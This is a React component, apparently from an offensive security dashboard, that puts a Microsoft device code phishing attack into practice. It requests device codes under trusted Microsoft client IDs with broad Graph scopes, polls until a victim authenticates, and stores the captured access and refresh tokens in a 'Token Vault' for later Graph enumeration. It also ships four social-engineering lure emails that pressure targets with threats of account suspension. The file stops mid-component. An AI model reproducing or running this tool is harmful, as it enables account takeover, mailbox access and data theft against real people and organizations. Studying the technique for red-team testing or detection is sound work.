import { useState, useEffect, useRef, useCallback } from 'react';
import {
  Box, Flex, Text, Heading, Button, Input, Textarea,
  SimpleGrid, Spinner,
} from '@chakra-ui/react';
import { motion, AnimatePresence } from 'framer-motion';
import { CopyIcon, CheckIcon, DeleteIcon, RepeatIcon } from '@chakra-ui/icons';
import { useNavigate, useParams, useLocation } from 'react-router-dom';
import { ENUM_CATALOG, slugify } from './graphEnumCatalog';

const MotionBox = motion(Box);

// ── Palette ──────────────────────────────────────────────────────────────────
const BLUE   = '#63B3ED';
const PURPLE = '#9F7AEA';
const GREEN  = '#68D391';
const RED    = '#FC8181';
const ORANGE = '#F6AD55';
const CYAN   = '#76E4F7';
const YELLOW = '#ECC94B';

// ── API ──────────────────────────────────────────────────────────────────────
const API = process.env.REACT_APP_API_URL || 'http://localhost:5000/api';
const authHdr = () => ({
  'Content-Type': 'application/json',
  Authorization: `Bearer ${localStorage.getItem('token') || ''}`,
});

// ── Device login URLs ─────────────────────────────────────────────────────────
const LOGIN_URLS = [
  'https://login.microsoftonline.com/common/oauth2/deviceauth',
  'https://login.microsoft.com/common/oauth2/deviceauth',
  'https://microsoft.com/devicelogin',
  'https://aka.ms/devicelogin',
];

// ── Known public client presets ───────────────────────────────────────────────
// tenantHint: 'organizations' = work/school only (AAD), 'common' = both
const CLIENT_PRESETS = [
  { label: 'Azure CLI',        id: '04b07795-8ddb-461a-bbee-02f9e1bf7b46', tenantHint: 'organizations' },
  { label: 'Azure PowerShell', id: '1950a258-227b-4e31-a9cf-717495945fc2', tenantHint: 'organizations' },
  { label: 'MS Office',        id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', tenantHint: 'organizations' },
  { label: 'MS Teams',         id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264', tenantHint: 'organizations', scopeHint: 'teams-mail' },
  { label: 'OneDrive Sync',    id: 'ab9b8c07-8f02-4f72-87fa-80105867a763', tenantHint: 'organizations' },
  { label: 'Outlook Mobile',   id: '27922004-5251-4030-b22d-91ecd9a37ea4', tenantHint: 'organizations' },
];

// Scope hint → full scope string mapping
const SCOPE_HINT_MAP = {
  'teams-mail': 'https://graph.microsoft.com/Chat.ReadWrite https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read https://graph.microsoft.com/Files.ReadWrite https://graph.microsoft.com/Sites.ReadWrite.All openid profile offline_access',
};

const SCOPE_PRESETS = [
  { label: 'Graph (Full)',        value: 'https://graph.microsoft.com/.default openid profile offline_access' },
  { label: 'Graph User.Read',     value: 'https://graph.microsoft.com/User.Read openid profile offline_access' },
  { label: 'Graph Mail.Read',     value: 'https://graph.microsoft.com/Mail.Read openid profile offline_access' },
  { label: 'Mail + Send',         value: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read openid profile offline_access' },
  { label: 'Teams Chat',          value: 'https://graph.microsoft.com/Chat.ReadWrite https://graph.microsoft.com/User.Read openid profile offline_access' },
  { label: 'Teams + Mail (Full)', value: 'https://graph.microsoft.com/Chat.ReadWrite https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read https://graph.microsoft.com/Files.ReadWrite https://graph.microsoft.com/Sites.ReadWrite.All openid profile offline_access' },
  { label: 'Azure Management',    value: 'https://management.azure.com/.default openid offline_access' },
  { label: 'Custom',              value: '' },
];

const LURE_TEMPLATES = [
  {
    label: 'IT Helpdesk',
    body: (code) =>
`Dear User,

Our IT Security team is performing a mandatory account verification.

Please visit the link below and enter the verification code when prompted:

  URL:  https://microsoft.com/devicelogin
  Code: ${code}

This verification must be completed within 15 minutes or your account access will be suspended.

If you have any issues, contact the IT Helpdesk at support@company.com.

IT Security Team`,
  },
  {
    label: 'MFA Re-enrollment',
    body: (code) =>
`Hi,

As part of our security upgrade, we are migrating all accounts to our new MFA system.

To re-enroll your account, please:
1. Open https://microsoft.com/devicelogin in your browser
2. Enter code: ${code}
3. Sign in with your corporate credentials

Failure to complete enrollment by end of day will result in account lockout.

IT Operations`,
  },
  {
    label: 'Microsoft 365 License',
    body: (code) =>
`Your Microsoft 365 license renewal requires verification.

To confirm your subscription:
- Visit: https://microsoft.com/devicelogin
- Enter code: ${code}

This step ensures uninterrupted access to Outlook, Teams, and SharePoint.

Microsoft Account Team`,
  },
  {
    label: 'Shared Document',
    body: (code) =>
`A confidential document has been shared with you.

To view it securely:
1. Go to https://microsoft.com/devicelogin
2. Enter access code: ${code}

The document will be available for 15 minutes once authenticated.`,
  },
];


// ── Utilities ────────────────────────────────────────────────────────────────
function decodeJWT(token) {
  try {
    const b64 = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
    return JSON.parse(atob(b64));
  } catch { return null; }
}

function fmtExpiry(exp) {
  if (!exp) return 'unknown';
  const d = new Date(exp * 1000);
  return d.toLocaleString();
}

function fmtCountdown(s) {
  const m = Math.floor(s / 60);
  const sec = s % 60;
  return `${m}:${String(sec).padStart(2, '0')}`;
}

// ── Sub-components ────────────────────────────────────────────────────────────
const inputSx = {
  variant: 'unstyled',
  bg: 'rgba(255,255,255,0.05)',
  border: '1px solid rgba(255,255,255,0.1)',
  borderRadius: '10px',
  px: 4, h: '40px', fontSize: 'sm',
  color: 'var(--dash-text-primary)',
  _placeholder: { color: 'var(--dash-text-muted)' },
  _hover: { border: `1px solid ${BLUE}50` },
  _focus: { border: `1px solid ${BLUE}80`, boxShadow: `0 0 0 1px ${BLUE}40` },
};

const Card = ({ children, accentColor = BLUE, ...props }) => (
  <Box
    bg="rgba(255,255,255,0.03)"
    border="1px solid rgba(255,255,255,0.07)"
    borderRadius="16px"
    overflow="hidden"
    {...props}
  >
    <Box h="3px" bgGradient={`linear(to-r, ${accentColor}, ${accentColor}00)`} />
    <Box p={5}>{children}</Box>
  </Box>
);

const TabBtn = ({ label, active, color, onClick }) => (
  <Button
    size="sm" variant="ghost" borderRadius="8px"
    color={active ? color : 'var(--dash-text-muted)'}
    bg={active ? `${color}18` : 'transparent'}
    border={active ? `1px solid ${color}40` : '1px solid transparent'}
    fontWeight={active ? 'semibold' : 'normal'}
    fontSize="12px" px={4}
    _hover={{ bg: `${color}12`, color }}
    onClick={onClick}
  >
    {label}
  </Button>
);

function CopyBtn({ text, size = 'xs' }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <Button size={size} variant="ghost" p={1} minW="unset" h="auto"
      color={copied ? GREEN : 'var(--dash-text-muted)'}
      _hover={{ color: copied ? GREEN : 'var(--dash-text-primary)' }}
      onClick={copy}
    >
      {copied ? <CheckIcon boxSize={3} /> : <CopyIcon boxSize={3} />}
    </Button>
  );
}

function JsonViewer({ data }) {
  const text = JSON.stringify(data, null, 2);
  return (
    <Box
      bg="rgba(0,0,0,0.4)" borderRadius="10px" p={4}
      fontFamily="'Courier New', monospace" fontSize="11px"
      color="#a8ff78" maxH="400px" overflowY="auto"
      border="1px solid rgba(255,255,255,0.07)"
      position="relative"
      css={{
        '&::-webkit-scrollbar': { width: '4px' },
        '&::-webkit-scrollbar-thumb': { background: 'rgba(255,255,255,0.15)', borderRadius: '4px' },
      }}
    >
      <Box position="absolute" top={2} right={2}><CopyBtn text={text} /></Box>
      <pre style={{ margin: 0, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>{text}</pre>
    </Box>
  );
}

// ── Main Component ────────────────────────────────────────────────────────────
const DeviceCodePhishingView = () => {
  // Config
  const [preset, setPreset]         = useState(CLIENT_PRESETS[0]);
  const [customClientId, setCustomClientId] = useState('');
  const [tenantId, setTenantId]     = useState('common');
  const [scopePresetIdx, setScopePresetIdx] = useState(0);
  const [customScope, setCustomScope] = useState('');

  // Flow state machine
  const [flowState, setFlowState]   = useState('idle'); // idle | loading | active | captured | expired | error
  const [dcData, setDcData]         = useState(null);   // device code response
  const [countdown, setCountdown]   = useState(0);
  const [pollMsg, setPollMsg]       = useState('');

  // Token vault — persisted in localStorage, expired tokens filtered on load
  const [tokens, setTokens] = useState(() => {
    try {
      const saved = JSON.parse(localStorage.getItem('dc_tokens') || '[]');
      return saved.filter((t) => t.expires_at && Date.now() < t.expires_at);
    } catch { return []; }
  });
  const [activeIdx, setActiveIdx] = useState(0);

  // History — all device codes ever initiated, stored in localStorage
  const [history, setHistory] = useState(() => {
    try { return JSON.parse(localStorage.getItem('dc_history') || '[]'); } catch { return []; }
  });

  // Lure
  const [lureIdx, setLureIdx]       = useState(0);
  const [lureText, setLureText]     = useState('');

  // Enumerate
  const [enumCat, setEnumCat]       = useState(ENUM_CATALOG[0].category);
  const [customEp, setCustomEp]     = useState('/v1.0/me');
  const [customLoading, setCustomLoading] = useState(false);
  const [customResult, setCustomResult] = useState(null);

  // Tabs — restore from router state when navigating back from result page
  const location = useLocation();
  const [tab, setTab] = useState(location.state?.tab || 'flow');

  const { slug } = useParams();
  const navigate  = useNavigate();

  const pollRef     = useRef(null);
  const countdownRef = useRef(null);

  const clientId = preset.label === 'Custom' ? customClientId : preset.id;
  const scope    = SCOPE_PRESETS[scopePresetIdx].value || customScope;
  const activeToken = tokens[activeIdx] || null;

  // Update lure text when user_code or lureIdx changes
  useEffect(() => {
    const code = dcData?.user_code || 'XXXX-XXXX';
    setLureText(LURE_TEMPLATES[lureIdx].body(code));
  }, [lureIdx, dcData]);

  // Persist active token ID so GraphResultView can find it
  useEffect(() => {
    const t = tokens[activeIdx];
    if (t) localStorage.setItem('dc_active_token_id', String(t.id));
  }, [activeIdx, tokens]);

  // Persist tokens to localStorage (skip expired on save too)
  useEffect(() => {
    const valid = tokens.filter((t) => t.expires_at && Date.now() < t.expires_at);
    localStorage.setItem('dc_tokens', JSON.stringify(valid));
  }, [tokens]);

  // Persist history
  useEffect(() => {
    localStorage.setItem('dc_history', JSON.stringify(history.slice(0, 200)));
  }, [history]);

  // Cleanup on unmount
  useEffect(() => () => {
    clearInterval(pollRef.current);
    clearInterval(countdownRef.current);
  }, []);

  // ── Initiate device code ─────────────────────────────────────────────────
  const initiate = async () => {
    if (!clientId) return;
    setFlowState('loading');
    setPollMsg('');
    clearInterval(pollRef.current);
    clearInterval(countdownRef.current);

    try {
      const r = await fetch(`${API}/device-code/initiate`, {
        method: 'POST',
        headers: authHdr(),
        body: JSON.stringify({ tenantId, clientId, scope }),
      });
      const d = await r.json();
      if (d.error) { setFlowState('error'); setPollMsg(d.error_description || d.error); return; }

      setDcData(d);
      setFlowState('active');
      setCountdown(d.expires_in || 900);

      // Log to history
      const histEntry = {
        id: Date.now(),
        user_code: d.user_code,
        device_code: d.device_code,
        client_id: clientId,
        client_label: preset.label,
        tenant_id: tenantId,
        scope,
        generated_at: new Date().toISOString(),
        expires_at: new Date(Date.now() + (d.expires_in || 900) * 1000).toISOString(),
        last_polled_at: null,
        status: 'PENDING',
        captured_upn: null,
      };
      setHistory((prev) => [histEntry, ...prev]);

      // Countdown timer
      countdownRef.current = setInterval(() => {
        setCountdown((c) => {
          if (c <= 1) {
            clearInterval(countdownRef.current);
            setFlowState('expired');
            setHistory((prev) => prev.map((h) => h.id === histEntry.id ? { ...h, status: 'EXPIRED' } : h));
            return 0;
          }
          return c - 1;
        });
      }, 1000);

      // Polling timer
      const interval = (d.interval || 5) * 1000;
      pollRef.current = setInterval(() => doPoll(d.device_code, clientId, histEntry.id), interval);
    } catch (e) {
      setFlowState('error');
      setPollMsg(e.message);
    }
  };

  // ── Poll for token ───────────────────────────────────────────────────────
  const doPoll = useCallback(async (deviceCode, cid, histId) => {
    try {
      const r = await fetch(`${API}/device-code/poll`, {
        method: 'POST',
        headers: authHdr(),
        body: JSON.stringify({ tenantId, clientId: cid, deviceCode }),
      });
      const d = await r.json();

      if (d.access_token) {
        clearInterval(pollRef.current);
        clearInterval(countdownRef.current);
        const claims = decodeJWT(d.access_token) || decodeJWT(d.id_token) || {};
        const upn = claims.upn || claims.email || claims.unique_name || claims.sub?.slice(0, 12) || 'Unknown';
        const entry = {
          id: Date.now(),
          access_token: d.access_token,
          refresh_token: d.refresh_token,
          id_token: d.id_token,
          expires_at: Date.now() + (d.expires_in || 3600) * 1000,
          scope: d.scope,
          claims,
          label: upn,
        };
        setTokens((prev) => [entry, ...prev]);
        setActiveIdx(0);
        setFlowState('captured');
        setPollMsg(`Token captured for ${entry.label}`);
        setHistory((prev) => prev.map((h) => h.id === histId
          ? { ...h, status: 'SUCCESS', last_polled_at: new Date().toISOString(), captured_upn: upn }
          : h));
        setTab('tokens');
      } else if (d.error === 'authorization_pending') {
        setPollMsg('Waiting for user to authenticate...');
        setHistory((prev) => prev.map((h) => h.id === histId ? { ...h, last_polled_at: new Date().toISOString() } : h));
      } else if (d.error === 'authorization_declined') {
        clearInterval(pollRef.current);
        clearInterval(countdownRef.current);
        setFlowState('error');
        setPollMsg('User declined the authentication request.');
        setHistory((prev) => prev.map((h) => h.id === histId ? { ...h, status: 'DECLINED', last_polled_at: new Date().toISOString() } : h));
      } else if (d.error === 'expired_token') {
        clearInterval(pollRef.current);
        clearInterval(countdownRef.current);
        setFlowState('expired');
        setPollMsg('Device code expired.');
        setHistory((prev) => prev.map((h) => h.id === histId ? { ...h, status: 'EXPIRED', last_polled_at: new Date().toISOString() } : h));
      } else if (d.error) {
        setPollMsg(d.error_description || d.error);
      }
    } catch (e) {
      setPollMsg(e.message);
    }
  }, [tenantId]);

  // ── Navigate to result page ──────────────────────────────────────────────
  const runQuery = (cat, query) => {
    navigate(`/dashboard/${slug}/intelligence/device-code-phishing/${slugify(cat.category)}/${slugify(query.label)}`);
  };

  const runCustom = async () => {
    if (!activeToken || !customEp) return;
    setCustomLoading(true);
    setCustomResult(null);
    try {
      const r = await fetch(`${API}/device-code/graph`, {
        method: 'POST',
        headers: authHdr(),
        body: JSON.stringify({ accessToken: activeToken.access_token, endpoint: customEp }),
      });
      setCustomResult(await r.json());
    } catch (e) {
      setCustomResult({ error: e.message });
    }
    setCustomLoading(false);
  };

  const removeToken = (id) => setTokens((p) => p.filter((t) => t.id !== id));

  // ── Render ───────────────────────────────────────────────────────────────
  return (
    <Box px={6} pb={12}>
      {/* Header */}
      <MotionBox initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.3 }} mb={6}>
        <Heading fontSize="2xl" color="var(--dash-text-primary)" mb={1}>
          Device Code <Text as="span" color="red.400">Phishing</Text>
        </Heading>
        <Text fontSize="sm" color="var(--dash-text-secondary)">
          Initiate OAuth 2.0 device code flows, capture access tokens, and enumerate Entra ID / Microsoft Graph.
        </Text>
      </MotionBox>

      {/* Tab bar */}
      <MotionBox initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }} mb={6}>
        <Flex gap={2} flexWrap="wrap">
          {[
            { key: 'flow',      label: 'Device Code Flow',               color: BLUE   },
            { key: 'tokens',    label: `Token Vault (${tokens.length})`, color: PURPLE },
            { key: 'enumerate', label: 'Enumerate',                      color: GREEN  },
            { key: 'history',   label: `History (${history.length})`,    color: CYAN   },
            { key: 'actions',   label: 'Actions & Reference',            color: ORANGE },
          ].map((t) => (
            <TabBtn key={t.key} label={t.label} active={tab === t.key} color={t.color} onClick={() => setTab(t.key)} />
          ))}
        </Flex>
      </MotionBox>

      <AnimatePresence mode="wait">

        {/* ── Tab: Flow ──────────────────────────────────────────────────── */}
        {tab === 'flow' && (
          <MotionBox key="flow" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <SimpleGrid columns={{ base: 1, xl: 2 }} gap={5} alignItems="start">

              {/* Config */}
              <Card accentColor={BLUE}>
                <Text fontSize="11px" fontWeight="bold" letterSpacing="widest" color={BLUE} textTransform="uppercase" mb={4}>
                  Configuration
                </Text>

                <Text fontSize="xs" color="var(--dash-text-muted)" mb={2}>Client App Preset</Text>
                <Flex gap={2} flexWrap="wrap" mb={4}>
                  {CLIENT_PRESETS.map((p) => (
                    <Button key={p.label} size="xs" variant="ghost" borderRadius="6px"
                      color={preset.label === p.label ? BLUE : 'var(--dash-text-muted)'}
                      bg={preset.label === p.label ? `${BLUE}18` : 'rgba(255,255,255,0.04)'}
                      border={`1px solid ${preset.label === p.label ? `${BLUE}40` : 'rgba(255,255,255,0.08)'}`}
                      _hover={{ bg: `${BLUE}12`, color: BLUE }}
                      onClick={() => {
                        setPreset(p);
                        // Auto-set tenant based on preset
                        if (p.tenantHint) setTenantId(p.tenantHint);
                        // Auto-select matching scope preset when a scope hint is set
                        if (p.scopeHint && SCOPE_HINT_MAP[p.scopeHint]) {
                          const idx = SCOPE_PRESETS.findIndex((s) => s.value === SCOPE_HINT_MAP[p.scopeHint]);
                          if (idx !== -1) setScopePresetIdx(idx);
                        }
                      }}
                    >
                      {p.label}
                    </Button>
                  ))}
                  <Button size="xs" variant="ghost" borderRadius="6px"
                    color={preset.label === 'Custom' ? BLUE : 'var(--dash-text-muted)'}
                    bg={preset.label === 'Custom' ? `${BLUE}18` : 'rgba(255,255,255,0.04)'}
                    border={`1px solid ${preset.label === 'Custom' ? `${BLUE}40` : 'rgba(255,255,255,0.08)'}`}
                    _hover={{ bg: `${BLUE}12`, color: BLUE }}
                    onClick={() => setPreset({ label: 'Custom', id: '' })}
                  >
                    Custom
                  </Button>
                </Flex>

                {preset.label === 'Custom' && (
                  <Box mb={4}>
                    <Text fontSize="xs" color="var(--dash-text-muted)" mb={1}>Client ID</Text>
                    <Input {...inputSx} value={customClientId} onChange={(e) => setCustomClientId(e.target.value)}
                      placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" />
                  </Box>
                )}

                {preset.label !== 'Custom' && (
                  <Box mb={4}>
                    <Text fontSize="xs" color="var(--dash-text-muted)" mb={1}>Client ID (read-only)</Text>
                    <Flex align="center" gap={2}
                      bg="rgba(0,0,0,0.3)" border="1px solid rgba(255,255,255,0.07)"
                      borderRadius="10px" px={3} h="40px"
                    >
                      <Text fontSize="xs" color="var(--dash-text-muted)" fontFamily="monospace" flex={1}>{preset.id}</Text>
                      <CopyBtn text={preset.id} />
                    </Flex>
                  </Box>
                )}

                <Box mb={4}>
                  <Flex align="center" gap={2} mb={2}>
                    <Text fontSize="xs" color="var(--dash-text-muted)">Tenant ID</Text>
                    {tenantId === 'organizations' && (
                      <Box px={1.5} py="1px" borderRadius="4px" bg="rgba(104,211,145,0.15)" border="1px solid rgba(104,211,145,0.3)">
                        <Text fontSize="9px" color="#68D391" fontWeight="bold">Work/School only</Text>
                      </Box>
                    )}
                    {tenantId === 'common' && (
                      <Box px={1.5} py="1px" borderRadius="4px" bg="rgba(246,173,85,0.15)" border="1px solid rgba(246,173,85,0.3)">
                        <Text fontSize="9px" color="#F6AD55" fontWeight="bold">Personal + Work</Text>
                      </Box>
                    )}
                    {tenantId === 'consumers' && (
                      <Box px={1.5} py="1px" borderRadius="4px" bg="rgba(99,179,237,0.15)" border="1px solid rgba(99,179,237,0.3)">
                        <Text fontSize="9px" color="#63B3ED" fontWeight="bold">Personal accounts only</Text>
                      </Box>
                    )}
                  </Flex>
                  {/* Quick-pick buttons */}
                  <Flex gap={2} flexWrap="wrap" mb={2}>
                    {[
                      { label: 'organizations', color: '#68D391' },
                      { label: 'common',        color: '#F6AD55' },
                      { label: 'consumers',     color: '#63B3ED' },
                    ].map((opt) => (
                      <Button key={opt.label} size="xs" variant="ghost" borderRadius="6px"
                        color={tenantId === opt.label ? opt.color : 'var(--dash-text-muted)'}
                        bg={tenantId === opt.label ? `${opt.color}18` : 'rgba(255,255,255,0.04)'}
                        border={`1px solid ${tenantId === opt.label ? `${opt.color}40` : 'rgba(255,255,255,0.08)'}`}
                        _hover={{ bg: `${opt.color}12`, color: opt.color }}
                        onClick={() => setTenantId(opt.label)}
                      >
                        {opt.label}
                      </Button>
                    ))}
                  </Flex>
                  <Input {...inputSx} value={tenantId} onChange={(e) => setTenantId(e.target.value)}
                    placeholder="or paste a specific tenant GUID / contoso.onmicrosoft.com" />
                </Box>

                <Box mb={5}>
                  <Text fontSize="xs" color="var(--dash-text-muted)" mb={2}>Scope Preset</Text>
                  <Flex gap={2} flexWrap="wrap" mb={3}>
                    {SCOPE_PRESETS.map((s, i) => (
                      <Button key={i} size="xs" variant="ghost" borderRadius="6px"
                        color={scopePresetIdx === i ? CYAN : 'var(--dash-text-muted)'}
                        bg={scopePresetIdx === i ? `${CYAN}18` : 'rgba(255,255,255,0.04)'}
                        border={`1px solid ${scopePresetIdx === i ? `${CYAN}40` : 'rgba(255,255,255,0.08)'}`}
                        _hover={{ bg: `${CYAN}12`, color: CYAN }}
                        onClick={() => setScopePresetIdx(i)}
                      >
                        {s.label}
                      </Button>
                    ))}
                  </Flex>
                  {/* Show resolved scope string */}
                  {scope && (
                    <Box bg="rgba(0,0,0,0.3)" borderRadius="8px" px={3} py={2} mb={2}>
                      <Text fontSize="9px" color="var(--dash-text-muted)" textTransform="uppercase" letterSpacing="wider" mb={1}>Active scope</Text>
                      <Text fontSize="10px" fontFamily="monospace" color={CYAN} lineHeight="1.6" wordBreak="break-all">
                        {scope.split(' ').map((s, i) => (
                          <Text key={i} as="span" display="block">{s}</Text>
                        ))}
                      </Text>
                    </Box>
                  )}
                  {SCOPE_PRESETS[scopePresetIdx].value === '' && (
                    <Input {...inputSx} value={customScope} onChange={(e) => setCustomScope(e.target.value)}
                      placeholder="https://graph.microsoft.com/.default openid offline_access" />
                  )}
                </Box>

                <Button
                  w="full" h="42px" borderRadius="10px" fontSize="sm" fontWeight="semibold"
                  bg={`${BLUE}22`} border={`1px solid ${BLUE}50`} color={BLUE}
                  _hover={{ bg: `${BLUE}33`, borderColor: BLUE }}
                  isLoading={flowState === 'loading'}
                  isDisabled={!clientId || flowState === 'active'}
                  onClick={initiate}
                >
                  {flowState === 'active' ? 'Polling...' : 'Initiate Device Code Flow'}
                </Button>
              </Card>

              {/* Device Code Display */}
              <Flex direction="column" gap={4}>
                <Card accentColor={
                  flowState === 'captured' ? GREEN :
                  flowState === 'expired'  ? RED   :
                  flowState === 'error'    ? RED   : BLUE
                }>
                  <Text fontSize="11px" fontWeight="bold" letterSpacing="widest"
                    color={flowState === 'captured' ? GREEN : flowState === 'error' || flowState === 'expired' ? RED : BLUE}
                    textTransform="uppercase" mb={4}>
                    {flowState === 'idle'     ? 'Device Code — Idle' :
                     flowState === 'loading'  ? 'Initiating...' :
                     flowState === 'active'   ? 'Waiting for Authentication' :
                     flowState === 'captured' ? 'Token Captured' :
                     flowState === 'expired'  ? 'Code Expired' : 'Error'}
                  </Text>

                  {flowState === 'idle' && (
                    <Flex direction="column" align="center" justify="center" py={8} gap={3}>
                      <Box w="48px" h="48px" borderRadius="12px" bg={`${BLUE}18`} border={`1px solid ${BLUE}30`}
                        display="flex" alignItems="center" justifyContent="center">
                        <Box as="svg" w="24px" h="24px" viewBox="0 0 24 24" fill="none" stroke={BLUE} strokeWidth="2">
                          <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
                          <line x1="12" y1="18" x2="12.01" y2="18" />
                        </Box>
                      </Box>
                      <Text fontSize="sm" color="var(--dash-text-muted)" textAlign="center">
                        Configure and initiate a device code flow to begin
                      </Text>
                    </Flex>
                  )}

                  {flowState === 'loading' && (
                    <Flex justify="center" py={8}><Spinner color={BLUE} size="lg" /></Flex>
                  )}

                  {(flowState === 'active' || flowState === 'captured') && dcData && (
                    <>
                      <Text fontSize="xs" color="var(--dash-text-muted)" mb={2} textAlign="center">
                        Share this code with your target
                      </Text>

                      {/* BIG user code */}
                      <Flex justify="center" mb={4}>
                        <Flex
                          align="center" gap={2}
                          bg="rgba(0,0,0,0.4)" border={`1px solid ${BLUE}50`}
                          borderRadius="10px" px={4} py={2}
                        >
                          <Text
                            fontSize="22px" fontWeight="black" letterSpacing="5px"
                            fontFamily="'Courier New', monospace" color="white"
                          >
                            {dcData.user_code}
                          </Text>
                          <CopyBtn text={dcData.user_code} size="sm" />
                        </Flex>
                      </Flex>

                      {/* Device Login URLs */}
                      <Box bg="rgba(0,0,0,0.3)" borderRadius="10px" p={3} mb={4}>
                        <Text fontSize="10px" color="var(--dash-text-muted)" textTransform="uppercase" letterSpacing="wider" mb={2}>
                          Device Login URLs
                        </Text>
                        <Flex direction="column" gap={1.5}>
                          {LOGIN_URLS.map((url) => (
                            <Flex key={url} align="center" justify="space-between"
                              bg="rgba(255,255,255,0.04)" borderRadius="7px" px={3} py={1.5}
                              border={url === (dcData.verification_uri) ? `1px solid ${BLUE}50` : '1px solid transparent'}>
                              <Text fontSize="11px" color={url === dcData.verification_uri ? BLUE : 'var(--dash-text-secondary)'}
                                fontFamily="monospace">{url}</Text>
                              <CopyBtn text={url} />
                            </Flex>
                          ))}
                        </Flex>
                      </Box>

                      {/* Status row */}
                      <Flex justify="space-between" align="center">
                        <Flex align="center" gap={2}>
                          {flowState === 'active' && <Spinner size="xs" color={BLUE} />}
                          {flowState === 'captured' && <Box w="8px" h="8px" borderRadius="full" bg={GREEN} boxShadow={`0 0 6px ${GREEN}`} />}
                          <Text fontSize="xs" color="var(--dash-text-secondary)">
                            {flowState === 'captured' ? pollMsg : (pollMsg || 'Waiting for authentication...')}
                          </Text>
                        </Flex>
                        {flowState === 'active' && (
                          <Text fontSize="xs" fontFamily="monospace" color={countdown < 120 ? RED : 'var(--dash-text-muted)'}>
                            {fmtCountdown(countdown)}
                          </Text>
                        )}
                      </Flex>

                      {/* Stop polling button */}
                      {flowState === 'active' && (
                        <Button
                          mt={3} w="full" size="sm" variant="ghost" borderRadius="8px"
                          color={RED} border={`1px solid ${RED}30`}
                          bg="rgba(252,129,129,0.06)"
                          _hover={{ bg: 'rgba(252,129,129,0.14)', borderColor: `${RED}60` }}
                          onClick={() => {
                            clearInterval(pollRef.current);
                            clearInterval(countdownRef.current);
                            setFlowState('idle');
                            setDcData(null);
                            setPollMsg('');
                            setCountdown(0);
                          }}
                        >
                          ✕ Stop Polling & Reset
                        </Button>
                      )}
                    </>
                  )}

                  {(flowState === 'expired' || flowState === 'error') && (
                    <Flex direction="column" align="center" gap={3} py={4}>
                      <Text fontSize="sm" color={RED}>{pollMsg || 'The device code has expired or an error occurred.'}</Text>
                      <Button size="sm" variant="ghost" color={BLUE} leftIcon={<RepeatIcon />}
                        _hover={{ bg: `${BLUE}18` }} onClick={() => { setFlowState('idle'); setDcData(null); }}>
                        Reset
                      </Button>
                    </Flex>
                  )}
                </Card>

                {/* Phishing Lure Templates */}
                {(flowState === 'active' || flowState === 'captured' || flowState === 'idle') && (
                  <Card accentColor={ORANGE}>
                    <Text fontSize="11px" fontWeight="bold" letterSpacing="widest" color={ORANGE} textTransform="uppercase" mb={3}>
                      Phishing Lure Templates
                    </Text>
                    <Flex gap={2} flexWrap="wrap" mb={3}>
                      {LURE_TEMPLATES.map((t, i) => (
                        <Button key={i} size="xs" variant="ghost" borderRadius="6px"
                          color={lureIdx === i ? ORANGE : 'var(--dash-text-muted)'}
                          bg={lureIdx === i ? `${ORANGE}18` : 'rgba(255,255,255,0.04)'}
                          border={`1px solid ${lureIdx === i ? `${ORANGE}40` : 'rgba(255,255,255,0.08)'}`}
                          _hover={{ bg: `${ORANGE}12`, color: ORANGE }}
                          onClick={() => setLureIdx(i)}
                        >
                          {t.label}
                        </Button>
                      ))}
                    </Flex>
                    <Box position="relative">
                      <Textarea
                        value={lureText}
                        onChange={(e) => setLureText(e.target.value)}
                        rows={10}
                        bg="rgba(0,0,0,0.3)" border="1px solid rgba(255,255,255,0.08)"
                        borderRadius="10px" fontSize="12px" fontFamily="monospace"
                        color="var(--dash-text-primary)" resize="vertical"
                        _focus={{ borderColor: `${ORANGE}60`, boxShadow: `0 0 0 1px ${ORANGE}30` }}
                      />
                      <Box position="absolute" top={2} right={2}><CopyBtn text={lureText} /></Box>
                    </Box>
                  </Card>
                )}
              </Flex>
            </SimpleGrid>
          </MotionBox>
        )}

        {/* ── Tab: Token Vault ───────────────────────────────────────────── */}
        {tab === 'tokens' && (
          <MotionBox key="tokens" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            {tokens.length === 0 ? (
              <Card accentColor={PURPLE}>
                <Flex direction="column" align="center" justify="center" py={12} gap={3}>
                  <Box w="48px" h="48px" borderRadius="12px" bg={`${PURPLE}18`} border={`1px solid ${PURPLE}30`}
                    display="flex" alignItems="center" justifyContent="center">
                    <Box as="svg" w="24px" h="24px" viewBox="0 0 24 24" fill="none" stroke={PURPLE} strokeWidth="2">
                      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                    </Box>
                  </Box>
                  <Text color="var(--dash-text-muted)" fontSize="sm">No tokens captured yet. Run a device code flow first.</Text>
                </Flex>
              </Card>
            ) : (
              <Flex direction="column" gap={4}>
                {tokens.map((t, i) => {
                  const isActive = i === activeIdx;
                  const expired = Date.now() > t.expires_at;
                  return (
                    <MotionBox key={t.id} initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }}
                      transition={{ delay: i * 0.05 }}>
                      <Card accentColor={isActive ? PURPLE : 'rgba(255,255,255,0.15)'}>
                        <Flex justify="space-between" align="flex-start" mb={3}>
                          <Flex align="center" gap={3}>
                            <Box w="8px" h="8px" borderRadius="full"
                              bg={expired ? RED : GREEN}
                              boxShadow={`0 0 6px ${expired ? RED : GREEN}`} />
                            <Box>
                              <Text fontSize="sm" fontWeight="semibold" color="var(--dash-text-primary)">{t.label}</Text>
                              <Text fontSize="xs" color="var(--dash-text-muted)">
                                Expires: {new Date(t.expires_at).toLocaleString()} {expired ? '(expired)' : ''}
